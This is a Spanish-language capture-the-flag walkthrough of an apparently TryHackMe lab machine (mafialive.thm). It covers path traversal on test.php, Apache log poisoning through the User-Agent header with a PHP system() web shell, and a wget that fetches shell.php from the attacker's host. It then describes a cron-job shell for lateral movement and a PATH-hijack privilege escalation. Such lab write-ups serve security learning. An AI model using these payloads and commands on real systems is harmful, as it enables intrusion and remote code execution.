```css
```PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
|   256 637327c76104256a08707a36b2f2840d (ECDSA)
|_  256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Web 
![[Pasted image 20231115001626.png]]
Al poner el dominio, ya tenemos la primera flag.

## Fuzzing
```
/robots.txt
/test.php
```

## Path Traversal

mirando el ``/etc/passwd`` 
![](lfi.png)

para ver los logs 
```
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log
```

## User-Agent Spoofing (BurpSuite)

Modificamos el php mediante el parámetro user-Agent:
```php
<?php system($_GET['cmd']);?>
```

![](agent.png)

Podemos ejecutar comandos mediante el parámetro ``&cmd=``
```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=id
```

![](user.png)

Cargamos una shell en php mediante wget. 
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=wget http://10.8.189.249:8000/shell.php
```

## Shell www-data

![[Pasted image 20231020001833.png]]

## movimiento lateral
hay una tarea cron que se ejecuta cada cierto tiempo, tenemos permisos de escritura en este archivo, así que vamos a meterle una shell, para pasarnos al usuario archangel.

![[Pasted image 20231020002053.png]]

![[Pasted image 20231020002120.png]]

## Elevar privilegios
Tenemos un binario ``backup`` que tira de ``cp`` para hacer alguna movida de copia. 

vamos a crear un ``cp`` falso el cual agregamos al path para que nos de una bash cuando ejecutemos el binario 
![[Pasted image 20231020002338.png]]

![[Pasted image 20231020002346.png]]

Al ejecutarlo ya somos root.